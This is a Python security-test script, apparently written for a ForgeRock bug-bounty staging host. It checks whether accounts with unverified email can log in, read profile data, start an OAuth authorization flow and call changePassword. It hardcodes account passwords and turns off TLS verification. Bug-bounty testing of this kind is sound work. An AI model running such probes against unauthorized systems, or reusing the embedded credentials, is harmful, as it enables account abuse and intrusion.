# -*- coding: utf-8 -*-
"""AIC 第五十九轮:业务驱动测试——未验证账号能否登录/使用(验证承诺是否撒谎)
假设:注册后需邮件验证才激活,但:
A. 未验证账号直接登录 -> 成功 = 验证承诺被绕过
B. 登录后获取 profile -> 状态字段(pending/active)?
C. 未验证账号能否发起 OAuth 授权码流?(资源访问能力)
D. 未验证账号能否用 changePassword 等敏感 action?
对照:已确认 pccp(正常账号)基线行为
"""
import requests, urllib3, json, time
urllib3.disable_warnings()

BASE = 'https://openam-bug-bounty-stag.forgeblocks.com'
AUTH = BASE + '/am/json/realms/alpha/authenticate'
COOKIE_NAME = 'aa942d46ece12ce'

def make_session():
    s = requests.Session()
    s.trust_env = False
    s.proxies = {'http': None, 'https': None}
    s.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'})
    return s

def login(s, u, p, tree='Login'):
    r = s.post(AUTH + '?authIndexType=service&authIndexValue=' + tree, json={}, timeout=15, verify=False)
    d = r.json()
    if 'authId' not in d:
        return None, d
    cbs = []
    for cb in d.get('callbacks', []):
        t = cb['type']
        inp = [{'name': 'IDToken1', 'value': u}] if t == 'NameCallback' else \
              [{'name': 'IDToken2', 'value': p}] if t == 'PasswordCallback' else \
              [{'name': k.get('name'), 'value': k.get('value')} for k in cb.get('input', [])]
        cbs.append({'type': t, 'output': cb.get('output', []), 'input': inp, '_id': cb.get('_id')})
    r2 = s.post(AUTH + '?authIndexType=service&authIndexValue=' + tree,
                json={'authId': d['authId'], 'callbacks': cbs}, timeout=15, verify=False)
    try:
        j = r2.json()
    except Exception:
        return None, {'raw': r2.text[:200]}
    return j.get('tokenId'), j

UNVERIFIED = [('regtest1644', 'RegTest1644!x'),
              ('regtest1650', 'RegTest1644!x'),
              ('regdiag1651', 'RegTest1651!x'),
              ('regdiag1648', 'RegTest1644!x')]

print('=== A. 未验证账号直接登录 ===')
for u, p in UNVERIFIED:
    s = make_session()
    tok, j = login(s, u, p)
    status = 'SUCCESS token=%s...' % tok[:18] if tok else 'FAIL'
    print('%-14s -> %s' % (u, status))
    if tok:
        s.headers.update({'Cookie': COOKIE_NAME + '=' + tok,
                          'Accept-API-Version': 'resource=2.1, protocol=1.0'})
        r = s.get(BASE + '/am/json/realms/root/realms/alpha/users?_queryFilter=userName%20eq%20%22' + u + '%22&_fields=userName,_id,mail,active,inetUserStatus,userAccountControl,lockedout',
                  timeout=12, verify=False)
        print('   profile: HTTP %d %s' % (r.status_code, r.text[:200].replace('\n', ' ')))
        time.sleep(0.5)

print('\n=== C. 未验证账号发起 OAuth 授权码流 ===')
s = make_session()
tok, j = login(s, 'regtest1644', 'RegTest1644!x')
if tok:
    s.headers.update({'Cookie': COOKIE_NAME + '=' + tok})
    url = BASE + '/am/oauth2/realms/alpha/authorize?client_id=endUserUIClient&response_type=code&scope=openid%20profile%20email&redirect_uri=' + BASE + '/enduser/sessionCheck.html&realm=/alpha'
    r = s.get(url, timeout=12, verify=False, allow_redirects=False)
    print('   authorize -> HTTP %d Location: %s' % (r.status_code, r.headers.get('Location', '')[:120]))
    time.sleep(0.5)

print('\n=== D. 未验证账号 changePassword(敏感 action) ===')
if tok:
    r = s.post(BASE + '/am/json/realms/root/realms/alpha/users/regtest1644?_action=changePassword',
               json={'currentpassword': 'RegTest1644!x', 'userpassword': 'RegTest1644!x'}, timeout=12, verify=False)
    print('   changePassword -> HTTP %d %s' % (r.status_code, r.text[:120].replace('\n', ' ')))

print('\n=== E. 对照:正常账号 pccp 状态字段 ===')
s2 = make_session()
tok2, _ = login(s2, 'pccp', 'Agent360User$5h2!QxR')
s2.headers.update({'Cookie': COOKIE_NAME + '=' + tok2,
                   'Accept-API-Version': 'resource=2.1, protocol=1.0'})
r = s2.get(BASE + '/am/json/realms/root/realms/alpha/users?_queryFilter=userName%20eq%20%22pccp%22&_fields=userName,_id,mail,active,inetUserStatus,userAccountControl,lockedout',
           timeout=12, verify=False)
print('   pccp: HTTP %d %s' % (r.status_code, r.text[:200].replace('\n', ' ')))
